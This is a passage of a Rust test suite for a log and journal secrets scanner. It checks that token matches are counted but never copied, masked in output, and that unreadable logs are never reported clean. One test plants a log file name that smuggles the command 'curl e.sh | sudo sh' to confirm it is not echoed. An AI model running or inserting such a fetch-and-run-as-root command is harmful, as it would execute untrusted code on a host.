//! The secrets scan against fixture logs and a stand-in journalctl. Tokens are made at run time
//! and never written to the repo.
//!
//! The safety branches each have a test named for them: nothing found is ever copied
//! (`..._never_copied`, `..._name_never_goes_out`), what can't be read is said and never clean
//! (`..._unscanned...`), a refused cursor is reset while the FAIL stands and an earlier boot's leak
//! survives it, and a dry run leaves no trace (`a_dry_run_...`).

use std::fs;
use std::io::Write;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::path::{Path, PathBuf};

use whimbrel::checks::secrets::KIND;
use whimbrel::run::Mode;
use whimbrel::sentence::Next;
use whimbrel::{Finding, Level};

mod common;

const COUNTS_ONLY: &str = "Counts only: the watch never copies what it finds.";

/// A host's logs, journal and state, in a temporary directory.
struct Machine {
    dir: tempfile::TempDir,
    max_mb: u64,
    logs: Vec<PathBuf>,
    optional_logs: Vec<String>,
    log_dirs: Vec<PathBuf>,
}

impl Machine {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let logs = dir.path().join("logs");
        let m = Machine {
            logs: vec![logs.join("setup.log"), logs.join("init.log")],
            optional_logs: vec![format!("{}/syslog*", logs.display())],
            log_dirs: vec![dir.path().join("app")],
            dir,
            max_mb: 200,
        };
        for sub in ["logs", "app"] {
            fs::create_dir(m.path(sub)).unwrap();
        }
        common::stub(m.dir.path(), "journalctl", common::JOURNALCTL);
        for name in ["setup.log", "init.log", "syslog"] {
            m.log(name, "ordinary line\n");
        }
        m
    }

    fn path(&self, name: &str) -> PathBuf {
        self.dir.path().join(name)
    }

    fn log(&self, name: &str, text: &str) -> PathBuf {
        let p = self.path("logs").join(name);
        fs::write(&p, text).unwrap();
        fs::set_permissions(&p, fs::Permissions::from_mode(0o600)).unwrap();
        p
    }

    fn journal(&self, text: &str) {
        fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(self.path("journal"))
            .unwrap()
            .write_all(text.as_bytes())
            .unwrap();
    }

    fn state(&self) -> PathBuf {
        self.path("state")
    }

    fn record(&self) -> PathBuf {
        self.state().join("secrets/journal.json")
    }

    fn table(&self, journalctl: &Path) -> String {
        format!(
            "logs = {:?}\n\
             optional_logs = {:?}\n\
             log_dirs = {:?}\n\
             max_mb = {}\n\
             journal = true\n\
             journalctl = {journalctl:?}\n\
             journal_secs = 2\n",
            self.logs, self.optional_logs, self.log_dirs, self.max_mb,
        )
    }

    fn run_as(&self, mode: Mode) -> Finding {
        // A run makes the watch's own directory before any check runs; a dry run never does.
        if mode == Mode::Run {
            fs::create_dir_all(self.state()).unwrap();
        }
        let table = self.table(&self.path("journalctl"));
        common::run(&KIND, &table, "the test host", &self.state(), mode)
    }

    fn run(&self) -> Finding {
        self.run_as(Mode::Run)
    }

    /// Everything the scan leaves anywhere: its finding, as it would be said, and its state.
    fn everything(&self, f: &Finding) -> String {
        let mut all = format!("{f:?}{}", f.sentence(&common::commands()));
        if let Ok(entries) = fs::read_dir(self.state().join("secrets")) {
            for e in entries.flatten() {
                all += &String::from_utf8_lossy(&fs::read(e.path()).unwrap_or_default());
            }
        }
        all
    }
}

impl Machine {
    /// A whole config for the binary, with this machine's scan as its one check.
    fn config(&self) -> PathBuf {
        let path = self.path("whimbrel.toml");
        let text = format!(
            "host = \"the test host\"\nstate_dir = {:?}\n\n[[check]]\nkind = \"secrets\"\n{}",
            self.state(),
            self.table(&self.path("journalctl"))
        );
        fs::write(&path, text).unwrap();
        fs::set_permissions(&path, fs::Permissions::from_mode(0o600)).unwrap();
        path
    }

    /// `whimbrel secrets` on this machine's config, with `extra` arguments: its exit code, stdout
    /// and stderr.
    fn secrets_command(&self, extra: &[&str]) -> (Option<i32>, String, String) {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_whimbrel"))
            .arg("secrets")
            .arg("--config")
            .arg(self.config())
            .args(extra)
            .output()
            .unwrap();
        (
            out.status.code(),
            String::from_utf8(out.stdout).unwrap(),
            String::from_utf8(out.stderr).unwrap(),
        )
    }

    /// `whimbrel secrets --allow-non-terminal`'s output, which must succeed.
    fn shown(&self) -> String {
        let (code, out, err) = self.secrets_command(&["--allow-non-terminal"]);
        assert_eq!(code, Some(0), "{err}");
        out
    }
}

/// A Slack-shaped token as the secrets command shows it: its prefix and its last four.
fn masked(token: &str) -> String {
    format!("xoxb-…{}", &token[token.len() - 4..])
}

/// What the scan says when it found something.
fn found(places: &str) -> String {
    format!(
        "Something on the test host logged a secret, so rotate it and find what logged it: \
         {places}."
    )
}

/// One place's part of the sentence, for the test token, which is Slack-bot-shaped.
fn slack(place: &str) -> String {
    format!("{place} matched `slack-bot-token`")
}

fn unscanned(names: &str) -> String {
    format!("The test host's watch couldn't scan some logs for secrets: {names}.")
}

fn gz(text: &str) -> Vec<u8> {
    let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    e.write_all(text.as_bytes()).unwrap();
    e.finish().unwrap()
}

fn files(dir: &Path) -> Vec<(PathBuf, Vec<u8>)> {
    let mut all: Vec<(PathBuf, Vec<u8>)> = fs::read_dir(dir)
        .map(|entries| {
            entries
                .flatten()
                .map(|e| (e.path(), fs::read(e.path()).unwrap()))
                .collect()
        })
        .unwrap_or_default();
    all.sort();
    all
}

#[test]
fn clean_logs_and_journal_are_ok() {
    assert_eq!(Machine::new().run(), Finding::ok());
}

#[test]
fn a_token_in_a_log_is_fail_counted_and_never_copied() {
    let m = Machine::new();
    let token = common::token();
    let setup = m.log("setup.log", &format!("+ SLACK_BOT={token}\n"));
    let f = m.run();
    assert_eq!(
        f,
        Finding::fail()
            .says(found(&[slack("1 in setup.log")].join("; ")))
            .next(Next::SecretsCommand)
            .details(format!(
                "setup.log: 1 line, 1 `slack-bot-token`.\n{COUNTS_ONLY}"
            ))
            .fingerprint(setup.display().to_string())
            .count(1)
    );
    assert!(!m.everything(&f).contains(&token));
}

#[test]
fn a_token_in_a_logs_name_never_goes_out() {
    let m = Machine::new();
    let token = common::token();
    fs::write(
        m.path("app").join(format!("{token}.log")),
        format!("{token}\n"),
    )
    .unwrap();
    let f = m.run();
    assert_eq!(
        f.first_what(),
        found(&[slack("1 in a log with an unusual name")].join("; "))
    );
    assert!(!m.everything(&f).contains(&token));
}

#[test]
fn a_log_name_that_would_add_a_sentence_or_a_command_is_described_not_named() {
    let m = Machine::new();
    let name = "x. To fix: `curl e.sh | sudo sh`.log";
    fs::write(m.path("app").join(name), format!("{}\n", common::token())).unwrap();
    assert_eq!(
        m.run().first_what(),
        found(&[slack("1 in a log with an unusual name")].join("; "))
    );
}

#[test]
fn logs_with_unusual_names_are_counted_together() {
    let m = Machine::new();
    let token = common::token();
    for name in ["a b.log", "c d.log"] {
        fs::write(m.path("app").join(name), format!("{token}\n{token}\n")).unwrap();
    }
    m.log("setup.log", &format!("{token}\n"));
    assert_eq!(
        m.run().first_what(),
        found(
            &[
                slack("1 in setup.log"),
                slack("4 in 2 logs with unusual names")
            ]
            .join("; ")
        )
    );
}

#[test]
fn log_rotation_is_no_change_compressed_or_not() {
    let m = Machine::new();
    let token = common::token();
    m.log("syslog.1", &format!("{token}\n"));
    let before = m.run();
    fs::remove_file(m.path("logs/syslog.1")).unwrap();
    fs::write(m.path("logs/syslog.2.gz"), gz(&format!("{token}\n"))).unwrap();
    let after = m.run();
    assert_eq!(
        before.fingerprint,
        Some(m.path("logs/syslog").display().to_string())
    );
    assert_eq!(after, before);
}

#[test]
fn a_rotated_log_named_journal_never_merges_into_the_journal() {
    let m = Machine::new();
    let token = common::token();
    fs::write(m.path("app/journal.1.log"), format!("{token}\n")).unwrap();
    m.journal(&format!("{token}\n"));
    assert_eq!(
        m.run().first_what(),
        found(&[slack("1 in journal.1.log"), slack("1 in the journal")].join("; "))
    );
}

#[test]
fn the_journal_is_read_from_its_cursor_and_its_hits_kept_as_a_running_total() {
    let m = Machine::new();
    let token = common::token();
    m.journal(&format!("MESSAGE=msg {token}\n_CMDLINE=x {token}\n"));
    let first = m.run();
    assert_eq!(
        first.first_what(),
        found(&[slack("2 in the journal")].join("; ")),
        "every field counts"
    );
    assert_eq!(first.fingerprint.as_deref(), Some("journal"));
    // Read again from the cursor: nothing new, and the old hits stand.
    m.journal("ordinary\n");
    assert_eq!(m.run(), first);
    // With no cursor it reads this boot only; with one, from it.
    let args = fs::read_to_string(m.path("args")).unwrap();
    let calls: Vec<&str> = args.lines().collect();
    assert!(calls[0].ends_with(" -b"), "{}", calls[0]);
    assert!(calls[1].ends_with(" --after-cursor=c2"), "{}", calls[1]);
    assert!(!m.everything(&first).contains(&token));
}

#[test]
fn another_hit_where_one_was_already_found_is_news_through_its_count() {
    let m = Machine::new();
    let token = common::token();
    m.journal(&format!("{token}\n"));
    let first = m.run();
    m.journal(&format!("{token}\n"));
    let more = m.run();
    assert_eq!(
        more.first_what(),
        found(&[slack("2 in the journal")].join("; "))
    );
    // The same logs: news only because the count rose, which the ledger compares.
    assert_eq!(more.fingerprint, first.fingerprint);
    assert_eq!((first.count, more.count), (Some(1), Some(2)));
}

#[test]
fn a_refused_cursor_is_reset_and_said_while_the_fail_stands_and_the_rescan_doesnt_double_count() {
    let m = Machine::new();
    let token = common::token();
    m.journal(&format!("{token}\n{token}\n"));
    let first = m.run();
    fs::write(
        m.record(),
        r#"{"cursor": "garbage", "total": 2, "by": {"slack-bot-token": 2}}"#,
    )
    .unwrap();
    let reset = m.run();
    assert_eq!(reset.level, Level::Fail, "{reset:?}");
    assert_eq!(
        reset.first_what(),
        "Something on the test host logged a secret, so rotate it and find what logged it: \
         2 in the journal matched `slack-bot-token`; the watch also couldn't scan journal \
         (cursor refused, so it's read again from this boot)."
    );
    // News: a FAIL that now says something more.
    assert_ne!(reset.fingerprint, first.fingerprint);
    // The rescan replaces the total, run after run, and the FAIL stays FAIL.
    for _ in 0..3 {
        assert_eq!(m.run(), first);
    }
}

#[test]
fn a_leak_in_an_earlier_boot_survives_a_reboot_and_a_reset() {
    let m = Machine::new();
    m.journal(&format!("{}\n", common::token()));
    let first = m.run();
    assert_eq!(
        first.first_what(),
        found(&[slack("1 in the journal")].join("; "))
    );
    // A reboot, then one exit journalctl gives as a refusal: the record is reset.
    m.journal("--boot--\nordinary\n");
    fs::write(m.path("journal.fail-once"), "").unwrap();
    assert_eq!(m.run().level, Level::Fail);
    // This boot, read from its start, has none of it, and the earlier leak still stands.
    for _ in 0..2 {
        assert_eq!(m.run(), first);
    }
}

#[test]
fn a_journalctl_that_dies_is_unscanned_and_leaves_the_record_alone() {
    let m = Machine::new();
    m.journal(&format!("{}\n", common::token()));
    m.run();
    let before = files(&m.state().join("secrets"));
    fs::write(m.path("journal.killed"), "").unwrap();
    let f = m.run();
    assert_eq!(f.level, Level::Fail);
    assert!(
        f.first_what()
            .ends_with("; the watch also couldn't scan journal."),
        "{}",
        f.first_what()
    );
    assert_eq!(files(&m.state().join("secrets")), before);
}

#[test]
fn a_journal_record_that_cant_be_parsed_is_unscanned_never_clear_and_is_left_alone() {
    let m = Machine::new();
    m.journal(&format!("{}\n", common::token()));
    assert_eq!(m.run().level, Level::Fail);
    // The leak was an earlier boot's, so this boot, read from its start, has no hits.
    m.journal("--boot--\nordinary\n");
    // Cut short, as a full disk or a stray edit would leave it.
    let whole = fs::read(m.record()).unwrap();
    fs::write(m.record(), &whole[..whole.len() - 1]).unwrap();
    let before = files(&m.state().join("secrets"));
    let asked = fs::read_to_string(m.path("args")).unwrap();
    let f = m.run();
    assert_eq!(f.level, Level::Warn, "{f:?}");
    assert!(
        f.first_what()
            .contains("journal (its record can't be read: "),
        "{}",
        f.first_what()
    );
    assert_eq!(files(&m.state().join("secrets")), before);
    // Without a cursor to read on from, journalctl isn't asked at all.
    assert_eq!(fs::read_to_string(m.path("args")).unwrap(), asked);
}

#[test]
fn a_journal_record_that_cant_be_read_is_unscanned_never_clear() {
    let m = Machine::new();
    m.journal(&format!("{}\n", common::token()));
    m.run();
    m.journal("--boot--\nordinary\n");
    // A read that fails, as against a file: a directory in the record's place.
    fs::remove_file(m.record()).unwrap();
    fs::create_dir(m.record()).unwrap();
    let asked = fs::read_to_string(m.path("args")).unwrap();
    let f = m.run();
    assert_eq!(f.level, Level::Warn, "{f:?}");
    assert!(
        f.first_what()
            .contains("journal (its record can't be read: "),
        "{}",
        f.first_what()
    );
    assert!(m.record().is_dir());
    assert_eq!(fs::read_to_string(m.path("args")).unwrap(), asked);
}

#[test]
fn a_dry_run_with_a_refused_cursor_says_so_and_changes_nothing() {
    let m = Machine::new();
    m.journal(&format!("{}\n", common::token()));
    m.run();
    fs::write(
        m.record(),
        r#"{"cursor": "garbage", "total": 1, "by": {"slack-bot-token": 1}}"#,
    )
    .unwrap();
    let before = files(&m.state().join("secrets"));
    let f = m.run_as(Mode::DryRun);
    assert!(
        f.first_what()
            .ends_with("journal (cursor refused, so it's read again from this boot)."),
        "{}",
        f.first_what()
    );
    assert_eq!(files(&m.state().join("secrets")), before);
}

#[test]
fn a_dry_run_counts_the_journal_but_moves_no_cursor_and_keeps_no_total() {
    let m = Machine::new();
    let token = common::token();
    // Never run: a dry run makes no state at all.
    m.journal(&format!("{token}\n"));
    assert_eq!(
        m.run_as(Mode::DryRun).first_what(),
        found(&[slack("1 in the journal")].join("; "))
    );
    assert!(!m.state().exists());
    // After a run, it reads from the cursor and adds to the total, and leaves both as they were.
    m.run();
    let before = files(&m.state().join("secrets"));
    m.journal(&format!("{token}\n"));
    assert_eq!(
        m.run_as(Mode::DryRun).first_what(),
        found(&[slack("2 in the journal")].join("; "))
    );
    assert_eq!(files(&m.state().join("secrets")), before);
    assert_eq!(
        m.run().first_what(),
        found(&[slack("2 in the journal")].join("; "))
    );
}

#[test]
fn nowhere_to_keep_the_cursor_is_said() {
    let m = Machine::new();
    fs::create_dir_all(m.state()).unwrap();
    // Its directory is a file, so there's nowhere to keep the record.
    fs::write(m.state().join("secrets"), "").unwrap();
    let f = m.run();
    assert_eq!(f.level, Level::Warn, "{f:?}");
    assert_eq!(
        f.first_what(),
        unscanned("journal (no place to keep its cursor)")
    );
}

#[test]
fn with_nowhere_to_keep_the_cursor_a_hit_in_the_journal_is_still_fail_and_counted() {
    let m = Machine::new();
    fs::create_dir_all(m.state()).unwrap();
    fs::write(m.state().join("secrets"), "").unwrap();
    m.journal(&format!("{}\n", common::token()));
    let f = m.run();
    assert_eq!(f.level, Level::Fail, "{f:?}");
    assert_eq!(
        f.first_what(),
        "Something on the test host logged a secret, so rotate it and find what logged it: \
         1 in the journal matched `slack-bot-token`; the watch also couldn't scan journal \
         (no place to keep its cursor)."
    );
    assert_eq!(f.count, Some(1));
}

#[test]
fn a_record_that_cant_be_written_is_said_apart_from_a_missing_directory() {
    // SAFETY: geteuid has no preconditions and can't fail.
    if unsafe { libc::geteuid() } == 0 {
        return; // Root writes through a read-only directory.
    }
    let m = Machine::new();
    // The directory is there, but nothing can be written in it.
    let dir = m.state().join("secrets");
    fs::create_dir_all(&dir).unwrap();
    fs::set_permissions(&dir, fs::Permissions::from_mode(0o500)).unwrap();
    let f = m.run();
    fs::set_permissions(&dir, fs::Permissions::from_mode(0o700)).unwrap();
    assert_eq!(f.level, Level::Warn, "{f:?}");
    assert_eq!(
        f.first_what(),
        unscanned("journal (its cursor can't be kept)")
    );
}

#[test]
fn a_first_run_that_finds_a_token_in_the_journal_is_fail() {
    let m = Machine::new();
    m.journal(&format!("{}\n", common::token()));
    assert_eq!(m.run().level, Level::Fail);
}

#[test]
fn a_missing_boot_log_is_unscanned_not_clean() {
    let m = Machine::new();
    fs::remove_file(m.path("logs/init.log")).unwrap();
    assert_eq!(
        m.run(),
        Finding::warn()
            .says(unscanned("init.log"))
            .see_dry_run()
            .fingerprint("init.log")
    );
}

#[test]
fn an_unreadable_journal_is_warn_never_ok() {
    let m = Machine::new();
    fs::write(m.path("journal.fail"), "").unwrap();
    assert_eq!(m.run().first_what(), unscanned("journal"));
}

#[test]
fn a_journal_that_takes_too_long_is_unscanned() {
    let m = Machine::new();
    // Slow only when it's asked something: the stub's own first run, before any test, isn't.
    let slow = common::stub(
        m.dir.path(),
        "slow",
        "#!/bin/sh\n[ $# -gt 0 ] && exec sleep 10\nexit 0\n",
    );
    fs::create_dir_all(m.state()).unwrap();
    let started = std::time::Instant::now();
    let f = common::run(
        &KIND,
        &m.table(&slow),
        "the test host",
        &m.state(),
        Mode::Run,
    );
    assert!(started.elapsed().as_secs() < 6, "{:?}", started.elapsed());
    assert_eq!(f.first_what(), unscanned("journal (no answer in 2s)"));
}

#[test]
fn a_log_under_a_log_dir_is_scanned_however_deep() {
    let m = Machine::new();
    fs::create_dir_all(m.path("app/jobs/a")).unwrap();
    let token = common::token();
    fs::write(m.path("app/jobs/a/job-run.log"), format!("{token}\n")).unwrap();
    fs::write(m.path("app/jobs/a/notes.txt"), format!("{token}\n")).unwrap();
    assert_eq!(
        m.run().first_what(),
        found(&[slack("1 in job-run.log")].join("; "))
    );
}

#[test]
fn a_fifo_or_a_link_is_unscanned_and_doesnt_hang_the_run() {
    let m = Machine::new();
    let fifo = m.path("app/pipe.log");
    assert!(
        std::process::Command::new("mkfifo")
            .arg(&fifo)
            .status()
            .unwrap()
            .success()
    );
    symlink("/dev/zero", m.path("app/zero.log")).unwrap();
    assert_eq!(
        m.run().first_what(),
        unscanned("pipe.log (not a regular file), zero.log")
    );
}

#[test]
fn a_linked_directory_is_never_followed() {
    let m = Machine::new();
    let elsewhere = m.path("elsewhere");
    fs::create_dir(&elsewhere).unwrap();
    fs::write(
        elsewhere.join("other.log"),
        format!("{}\n", common::token()),
    )
    .unwrap();
    symlink(&elsewhere, m.path("app/linked")).unwrap();
    // A loop, too: walking into it would never end.
    symlink(m.path("app"), m.path("app/again")).unwrap();
    assert_eq!(m.run(), Finding::ok());
}

// What can't be read is made unreadable by a path through a regular file, which fails for root
// too, so these assert wherever they run.

#[test]
fn a_log_dir_it_cant_list_is_unscanned() {
    let mut m = Machine::new();
    m.log_dirs.push(m.path("logs/setup.log"));
    assert_eq!(m.run().first_what(), unscanned("setup.log"));
}

#[test]
fn an_unreadable_log_is_unscanned() {
    let mut m = Machine::new();
    m.logs[1] = m.path("logs/setup.log/init.log");
    assert_eq!(m.run().first_what(), unscanned("init.log"));
}

#[test]
fn an_unreadable_directory_of_other_logs_is_unscanned() {
    let mut m = Machine::new();
    m.optional_logs = vec![format!("{}/syslog*", m.path("logs/setup.log").display())];
    assert_eq!(m.run().first_what(), unscanned("setup.log"));
}

#[test]
fn a_truncated_gz_is_unscanned_not_a_crash() {
    let m = Machine::new();
    let whole = gz(&format!("{}\n", common::token()).repeat(50));
    fs::write(m.path("logs/syslog.3.gz"), &whole[..40]).unwrap();
    assert_eq!(m.run().first_what(), unscanned("syslog.3.gz"));
}

#[test]
fn a_log_too_big_to_scan_is_unscanned_not_skipped() {
    let mut m = Machine::new();
    m.max_mb = 0;
    assert_eq!(
        m.run().first_what(),
        unscanned("setup.log (over 0 MB), init.log (over 0 MB), syslog (over 0 MB)")
    );
}

#[test]
fn its_state_is_owner_only() {
    let m = Machine::new();
    m.run();
    let mode = |p: &Path| fs::metadata(p).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode(&m.state().join("secrets")), 0o700);
    assert_eq!(mode(&m.record()), 0o600);
}

#[test]
fn what_to_run_about_a_hit_is_the_secrets_command_and_about_a_gap_a_dry_run() {
    let m = Machine::new();
    m.log("setup.log", &format!("{}\n", common::token()));
    let f = m.run();
    assert_eq!(f.problems[0].next, Some(Next::SecretsCommand));
    assert!(
        f.sentence(&common::commands())
            .ends_with(" See `whimbrel secrets --config /etc/whimbrel.toml`."),
        "{}",
        f.sentence(&common::commands())
    );
    fs::remove_file(m.path("logs/init.log")).unwrap();
    m.log("setup.log", "ordinary line\n");
    assert_eq!(m.run().problems[0].next, Some(Next::DryRun));
}

#[test]
fn the_journal_is_read_only_when_asked() {
    let m = Machine::new();
    let table = m
        .table(&m.path("journalctl"))
        .replace("journal = true\n", "");
    fs::create_dir_all(m.state()).unwrap();
    m.journal(&format!("{}\n", common::token()));
    let f = common::run(&KIND, &table, "the test host", &m.state(), Mode::Run);
    assert_eq!(f, Finding::ok());
    assert!(!m.path("args").exists(), "journalctl ran");
}

/// The check's table refused, and why.
fn refused(table: &str, patterns: &whimbrel::secret_patterns::SecretPatterns) -> String {
    let table: whimbrel::toml::Table = whimbrel::toml::from_str(table).unwrap();
    let shared = whimbrel::Shared {
        secret_patterns: patterns,
    };
    KIND.configure(table, &shared).err().unwrap()
}

#[test]
fn a_scan_with_nothing_to_scan_or_nothing_to_look_for_is_refused() {
    use whimbrel::secret_patterns::SecretPatterns;
    let builtins = SecretPatterns::builtins();
    assert_eq!(
        refused("", &builtins),
        "there's nothing to scan: set logs, optional_logs, log_dirs or journal"
    );
    let none = SecretPatterns::new(false, &[], &[]).unwrap();
    assert_eq!(
        refused("journal = true", &none),
        "there are no secret patterns to look for: secret_patterns has its built-ins off and \
         none of its own"
    );
    assert_eq!(
        refused("logs = [\"relative.log\"]", &builtins),
        "every log and log directory must be an absolute path"
    );
}

#[test]
fn a_config_pattern_is_found_like_a_builtin() {
    use whimbrel::secret_patterns::SecretPatterns;
    let m = Machine::new();
    m.log("setup.log", "issued myco_0123abcd to the worker\n");
    let mine = SecretPatterns::new(false, &[], &["myco_[0-9a-f]{8}".into()]).unwrap();
    let table: whimbrel::toml::Table =
        whimbrel::toml::from_str(&m.table(&m.path("journalctl"))).unwrap();
    let shared = whimbrel::Shared {
        secret_patterns: &mine,
    };
    let check = KIND.configure(table, &shared).unwrap();
    fs::create_dir_all(m.state()).unwrap();
    let run = whimbrel::Run {
        now: std::time::SystemTime::UNIX_EPOCH,
        host: "the test host",
        state_dir: &m.state(),
        mode: Mode::Run,
    };
    let f = check.find(&run);
    assert_eq!(f.level, Level::Fail);
    assert_eq!(
        f.first_what(),
        found("1 in setup.log matched one of your own patterns")
    );
    assert!(!m.everything(&f).contains("myco_0123abcd"));
    // Described, never quoted: the pattern itself may say what a secret looks like.
    assert!(!m.everything(&f).contains("myco_["), "{}", m.everything(&f));
    assert!(
        f.details
            .as_deref()
            .unwrap()
            .contains("1 by your own pattern 1")
    );
}

#[test]
fn a_journal_timeout_of_zero_or_past_a_day_is_refused() {
    for secs in [0u64, 86_401] {
        let table: whimbrel::toml::Table =
            whimbrel::toml::from_str(&format!("journal = true\njournal_secs = {secs}")).unwrap();
        let why = common::configure(&KIND, table).err();
        assert_eq!(
            why.as_deref(),
            Some("journal_secs must be from 1 to 86400"),
            "{secs}"
        );
    }
}

#[test]
fn a_journal_record_without_names_says_only_how_many() {
    let m = Machine::new();
    let token = common::token();
    m.journal(&format!("{token}\n"));
    m.run();
    // A record as one kept before it kept names: a count and nothing about what matched.
    fs::write(m.record(), r#"{"cursor": "c1", "total": 3}"#).unwrap();
    assert_eq!(m.run().first_what(), found("3 in the journal"));
}

#[test]
fn two_patterns_on_one_line_are_both_named_and_the_line_counts_once() {
    let m = Machine::new();
    let slack_token = common::token();
    let github = format!("ghp_{}", "a1".repeat(18));
    m.log("setup.log", &format!("{slack_token} {github}\n{github}\n"));
    let f = m.run();
    assert_eq!(
        f.first_what(),
        found("2 in setup.log matched `github-pat` and `slack-bot-token`")
    );
    assert_eq!(f.count, Some(2));
    assert!(
        f.details
            .as_deref()
            .unwrap()
            .starts_with("setup.log: 2 lines, 2 `github-pat`, 1 `slack-bot-token`."),
        "{:?}",
        f.details
    );
}

#[test]
fn at_most_three_patterns_are_named_for_one_log_and_the_rest_counted() {
    let m = Machine::new();
    let line = [
        common::token(),
        format!("ghp_{}", "a1".repeat(18)),
        format!("AKIA{}", "Q".repeat(16)),
        format!("glpat-{}", "a".repeat(20)),
        format!("npm_{}", "a1".repeat(18)),
    ]
    .join(" ");
    m.log("setup.log", &format!("{line}\n"));
    let f = m.run();
    let said = f.first_what();
    assert_eq!(said.matches('`').count(), 6, "{said}");
    assert!(said.ends_with(" and 2 more."), "{said}");
    // The details name every one.
    let details = f.details.as_deref().unwrap();
    for id in [
        "slack-bot-token",
        "github-pat",
        "aws-access-token",
        "gitlab-pat",
        "npm-access-token",
    ] {
        assert!(details.contains(&format!("`{id}`")), "{id}: {details}");
    }
}

#[test]
fn the_journals_pattern_names_survive_a_second_run() {
    let m = Machine::new();
    let github = format!("ghp_{}", "a1".repeat(18));
    m.journal(&format!("{github}\n"));
    assert_eq!(
        m.run().first_what(),
        found("1 in the journal matched `github-pat`")
    );
    // Nothing new in the journal: the record alone carries the name.
    assert_eq!(
        m.run().first_what(),
        found("1 in the journal matched `github-pat`")
    );
    // Another kind joins it, and both are named, with the total risen.
    m.journal(&format!("{}\n", common::token()));
    let f = m.run();
    assert_eq!(
        f.first_what(),
        found("2 in the journal matched `github-pat` and `slack-bot-token`")
    );
    assert_eq!(f.count, Some(2));
    let record = fs::read_to_string(m.record()).unwrap();
    assert!(
        record.contains("\"github-pat\":1") && record.contains("\"slack-bot-token\":1"),
        "{record}"
    );
}

#[test]
fn no_matched_text_reaches_the_sentence_the_details_the_fingerprint_or_the_state() {
    let m = Machine::new();
    let github = format!("ghp_{}", "a1".repeat(18));
    let slack_token = common::token();
    m.log("setup.log", &format!("{github}\n"));
    m.journal(&format!("{slack_token}\n"));
    let f = m.run();
    assert_eq!(f.level, Level::Fail);
    let all = m.everything(&f);
    assert!(f.details.is_some() && f.fingerprint.is_some());
    for token in [&github, &slack_token] {
        assert!(!all.contains(token.as_str()), "{all}");
        // Nor any long piece of one.
        assert!(!all.contains(&token[..12]), "{all}");
    }
}

#[test]
fn the_secrets_command_lists_every_hit_with_its_place_and_counts_as_the_alert_does() {
    let m = Machine::new();
    let (a, b, c, d) = (
        common::token(),
        common::token(),
        common::token(),
        common::token(),
    );
    let setup = m.log("setup.log", &format!("ordinary line\n+ SLACK_BOT={a}\n"));
    // A rotated log counts with the log it was.
    let rotated = m.log("syslog.1", &format!("{b} and again {b}\n"));
    fs::create_dir_all(m.path("app/deep")).unwrap();
    let deep = m.path("app/deep/worker.log");
    fs::write(&deep, format!("one\ntwo\nthree {c}\n")).unwrap();
    m.journal(&format!("ordinary\nmsg {d}\n"));
    let alert = m.run();
    let shown = m.shown();
    let lines: Vec<&str> = shown.lines().collect();
    for want in [
        format!("{}:2  slack-bot-token  {}", setup.display(), masked(&a)),
        format!("{}:1  slack-bot-token  {}", rotated.display(), masked(&b)),
        format!("{}:3  slack-bot-token  {}", deep.display(), masked(&c)),
        format!(
            "journal  time unknown  MESSAGE  slack-bot-token  {}",
            masked(&d)
        ),
    ] {
        assert!(lines.contains(&want.as_str()), "no {want:?} in\n{shown}");
    }
    // Two matches on one line are two hits, and one line in the count.
    let twice = format!("{}:1  slack-bot-token  {}", rotated.display(), masked(&b));
    assert_eq!(lines.iter().filter(|l| **l == twice).count(), 2);
    // Each place's count is the alert's, word for word; only the journal's name says it's this
    // boot, since the alert's is a running total.
    let details = alert.details.unwrap();
    let want: Vec<String> = details
        .lines()
        .filter(|l| *l != COUNTS_ONLY)
        .map(|l| l.replace("the journal:", "the journal, this boot:"))
        .collect();
    let summary: Vec<String> = shown
        .split("\n\n")
        .nth(1)
        .unwrap()
        .lines()
        .filter(|l| !l.starts_with(EARLIER_BOOTS))
        .map(str::to_string)
        .collect();
    assert_eq!(summary, want);
    assert_eq!(want.len(), 4, "{details}");
    assert!(shown.contains(EARLIER_BOOTS), "{shown}");
}

#[test]
fn the_secrets_command_never_prints_a_whole_token() {
    let m = Machine::new();
    let tokens: Vec<String> = (0..3).map(|_| common::token()).collect();
    m.log("setup.log", &format!("{}\n", tokens[0]));
    // In a log's name, too: the path is redacted.
    fs::write(
        m.path("app").join(format!("{}.log", tokens[1])),
        format!("{}\n", tokens[1]),
    )
    .unwrap();
    m.journal(&format!("{}\n", tokens[2]));
    let (code, out, err) = m.secrets_command(&["--allow-non-terminal"]);
    assert_eq!(code, Some(0), "{err}");
    assert!(out.contains("[redacted].log:1  slack-bot-token"), "{out}");
    for t in &tokens {
        assert!(
            !out.contains(t.as_str()) && !err.contains(t.as_str()),
            "{out}{err}"
        );
        // Nor more than four characters running of the part that differs between tokens:
        // everything after `xoxb-`.
        let rest = &t[5..];
        for i in 0..=rest.len() - 5 {
            let window = &rest[i..i + 5];
            assert!(!out.contains(window), "{window:?} of a token in\n{out}");
        }
    }
}

#[test]
fn the_secrets_command_shows_a_quarter_of_a_short_password_in_a_url_at_most() {
    let m = Machine::new();
    // Built here, so the repo holds no URL with a password in it.
    let key = format!("{}=", "password");
    m.log("setup.log", &format!("GET https://h/api?{key}abc\n"));
    m.log("init.log", &format!("GET https://h/api?{key}abcdef\n"));
    let shown = m.shown();
    // Three characters: none of them. Six: one.
    assert!(
        shown.contains(&format!("setup.log:1  password-in-url  ?{key}…\n")),
        "{shown}"
    );
    assert!(
        shown.contains(&format!("init.log:1  password-in-url  ?{key}…f\n")),
        "{shown}"
    );
}

/// How the command's note on the journal's earlier boots starts.
const EARLIER_BOOTS: &str = "Earlier boots aren't read";

#[test]
fn the_secrets_command_shows_nothing_of_a_log_it_cant_read_to_its_end() {
    let mut m = Machine::new();
    m.max_mb = 1;
    let token = common::token();
    // A hit on its first line, then more than 1 MB of what it decompresses to.
    let mut text = format!("{token}\n");
    text += &"an ordinary line, again\n".repeat(60_000);
    let path = m.path("logs").join("syslog.1.gz");
    fs::write(&path, gz(&text)).unwrap();
    let shown = m.shown();
    assert!(!shown.contains("syslog.1.gz:"), "{shown}");
    assert!(
        shown.contains("Couldn't scan syslog.1.gz (over 1 MB)."),
        "{shown}"
    );
    assert!(shown.contains("The logs: no lines."), "{shown}");
}

#[test]
fn after_a_reboot_the_command_says_this_boots_journal_is_clean_and_earlier_ones_arent_read() {
    let m = Machine::new();
    m.journal(&format!("{}\n", common::token()));
